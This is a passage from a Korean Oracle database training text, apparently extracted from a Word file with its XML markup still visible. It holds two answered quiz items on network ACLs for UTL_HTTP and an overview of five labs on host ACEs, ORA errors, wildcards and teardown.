사용자가 같은 서버를 가리키는 이름으로 http://oel7v9:8090/을 호출했다. 결과와 이유로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성공한다. 이름이 IP로 풀리기 때문이다  ② ORA-24247이 난다. ACL은 호출에 쓴 호스트 문자열로 판정하기 때문이다  ③ ORA-24244가 난다. 이름과 IP가 겹치기 때문이다  ④ resolve 권한만 있으면 성공한다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ACL은 URL에 적힌 호스트 문자열을 기준으로 찾는다. oel7v9로 등록된 ACE가 없으므로 거부된다. 이름과 IP를 모두 쓰면 둘 다 등록한다.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역할 WEB_ROLE에 http ACE를 주고 사용자에게 그 역할을 기본 역할로 부여했다. 이 사용자가 소유한 정의자 권한 프로시저 안에서 UTL_HTTP를 호출했을 때 거부된 이유로 가장 알맞은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정의자 권한 프로시저에서는 역할이 비활성화된다  ② 역할에는 ACE를 줄 수 없다  ③ 프로시저 안에서는 ACL이 무시된다  ④ 기본 역할은 ACL 판정에서 제외된다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①. 정의자 권한 프로시저 안에서는 역할이 꺼진 상태로 실행되므로 역할 ACE가 적용되지 않는다. 프로시저 소유자에게 직접 ACE를 준다.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.14  실습 개요</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>실습은 oel7v9 서버의 orcl 데이터베이스(19.3, non-CDB)에서 진행한다. 접속 대상은 같은 서버에 python 내장 서버로 띄운 시험용 HTTP 서버(172.16.225.50:8090)다. 01에서 만든 사용자와 ACE를 04까지 이어 쓰고, 05에서 시험용 서버까지 모두 철거한다.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4장_실습_01_UTL_HTTP와ORA-24247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PUBLIC 실행 권한과 ACL의 관계, ORA-24247, APPEND_HOST_ACE, DBA_HOST_ACLS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4.2, 4.3.1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4장_실습_02_권한종류와포트범위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http와 connect의 차이, resolve와 포트(ORA-24244), 포트 범위 겹침, 이름과 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4.4, 4.5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4장_실습_03_와일드카드우선순위와거부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서브넷 와일드카드, DOMAINS 검색 순서, 거부 ACE, USER_HOST_ACES, REMOVE_HOST_ACE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4.6, 4.3.3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4장_실습_04_역할부여와구버전API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역할 ACE와 SET ROLE NONE, CREATE_ACL·ASSIGN_ACL, ORA-46212, 신구 뷰 비교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4.4.2, 4.3.4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4장_실습_05_점검과원복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점검 조회, ORA-01927·ORA-46114, 철거와 원복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4.8, 4.9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